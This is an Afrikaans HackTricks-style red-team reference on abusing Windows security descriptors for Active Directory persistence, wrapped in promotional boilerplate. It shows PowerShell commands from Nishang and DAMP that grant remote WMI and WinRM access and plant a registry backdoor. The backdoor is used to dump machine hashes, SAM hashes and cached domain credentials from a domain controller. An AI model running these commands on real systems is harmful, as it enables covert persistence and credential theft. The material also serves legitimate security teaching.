# Sekuriteitsbeskrywings

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy in HackTricks wil adverteer** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## Sekuriteitsbeskrywings

[Volgens die dokumentasie](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Sekuriteitsbeskrywingsdefinisie-taal (SDDL) definieer die formaat wat gebruik word om 'n sekuriteitsbeskrywing te beskryf. SDDL gebruik ACE-reekse vir DACL en SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`

Die **sekuriteitsbeskrywings** word gebruik om die **regte** wat 'n **voorwerp** oor 'n **voorwerp** het, **te stoor**. As jy net 'n **klein verandering** in die **sekuriteitsbeskrywing** van 'n voorwerp kan maak, kan jy baie interessante regte oor daardie voorwerp verkry sonder om lid van 'n bevoorregte groep te wees.

Hierdie volhardingstegniek is dus gebaseer op die vermoë om elke nodige reg teenoor sekere voorwerpe te wen, om 'n taak uit te voer wat gewoonlik administratiewe regte vereis sonder om administrateur te wees.

### Toegang tot WMI

Jy kan 'n gebruiker toegang gee om **WMI op afstand uit te voer** [**deur hierdie**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1) te gebruik:
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### Toegang tot WinRM

Gee toegang tot die **winrm PS-konsole aan 'n gebruiker** [**deur hierdie skakel**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)** te gebruik:**
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Afstandstoegang tot hasings

Kry toegang tot die **register** en **dump hasings** deur 'n **Reg agterdeur te skep met behulp van** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** sodat jy te eniger tyd die **hash van die rekenaar**, die **SAM** en enige **gekaste AD**-geloofsbriewe op die rekenaar kan herwin. Dit is baie nuttig om hierdie toestemming aan 'n **gewone gebruiker teen 'n Domeinbeheerder-rekenaar** te gee:
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Kyk na [**Silver Tickets**](silver-ticket.md) om te leer hoe jy die has van die rekenaarrekening van 'n Domeinbeheerder kan gebruik.

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslagplekke.

</details>
